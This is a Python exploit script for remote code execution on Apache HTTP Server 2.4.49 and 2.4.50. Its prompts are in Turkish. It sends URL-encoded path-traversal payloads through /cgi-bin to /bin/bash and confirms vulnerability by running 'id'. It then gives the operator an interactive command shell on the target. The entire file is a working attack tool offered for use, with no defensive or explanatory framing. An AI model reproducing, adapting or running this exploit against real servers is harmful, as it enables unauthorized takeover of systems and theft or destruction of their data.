import os
import re
import sys
import time
import requests
from colorama import Fore,Style


header = ''''''


if len(sys.argv) < 2 :
    print('Use: python3 apache.py ip:port ' )
    sys.exit()

def end():
    sys.exit(1)

def commands(url,command,session):
    directory = mute_command(url,'pwd')
    user = mute_command(url,'whoami')
    hostname = mute_command(url,'hostname')
    command = input(f"{Fore.RED}╭─{Fore.GREEN + user}@{hostname}: {Fore.BLUE + directory}\n{Fore.RED}╰─{Fore.YELLOW}$ {Style.RESET_ALL}")    
    command = f"echo; {command};"
    req = requests.Request('POST', url=url, data=command)
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    output = response.text
    print(output)
    if 'clear' in command:
        os.system('/usr/bin/clear')
        print(header)
    if 'exit' in command:
        end()

def mute_command(url,command):
    session = requests.Session()
    req = requests.Request('POST', url=url, data=f"echo; {command}")
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    return response.text.strip()


def exploitRCE(payload):
    s = requests.Session()
    try:
        host = sys.argv[1]
        if 'http' not in host:
            url = 'http://'+ host + payload
        else:
            url = host + payload 
        session = requests.Session()
        command = "echo; id"
        req = requests.Request('POST', url=url, data=command)
        prepare = req.prepare()
        prepare.url = url  
        response = session.send(prepare, timeout=5)
        output = response.text
        if "uid" in output:
            choice = "Y"
            print(Fore.YELLOW+'[+]'+Fore.RESET+' Hedef %s savunmasız!' % host)
            print(Fore.BLUE+"[*]"+Fore.RESET+" Sorti:\n\n"+Style.BRIGHT+output+Style.RESET_ALL)
            choice = input(Fore.CYAN+"[?]"+Fore.RESET+" Bu RCE'den yararlanmak ister misin? (Y/n): ")
            if choice.lower() in ['','y','yes']:
                while True:
                    commands(url,command,session)  
            else:
                end()       
        else:
            print(Fore.RED+'[-]'+Fore.RESET+' Hedef %s savunmasız' % host)
    except KeyboardInterrupt:
        end()

def main():
    try:
        apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
        payloads = [apache2449_payload,apache2450_payload]
        choice = len(payloads) + 1
        print(header)
        print(Fore.CYAN+"[0]"+Fore.RESET+" Apache 2.4.49 RCE\n"+Fore.CYAN+"[1]"+Fore.RESET+" Apache 2.4.50 RCE")
        while choice >= len(payloads) and choice >= 0:
            choice = int(input(Fore.MAGENTA+'\n[~]'+Fore.RESET+'Seçim edin: '))
            if choice < len(payloads):
                exploitRCE(payloads[choice])
    except KeyboardInterrupt:
            sys.exit(1)

if __name__ == '__main__':
    main()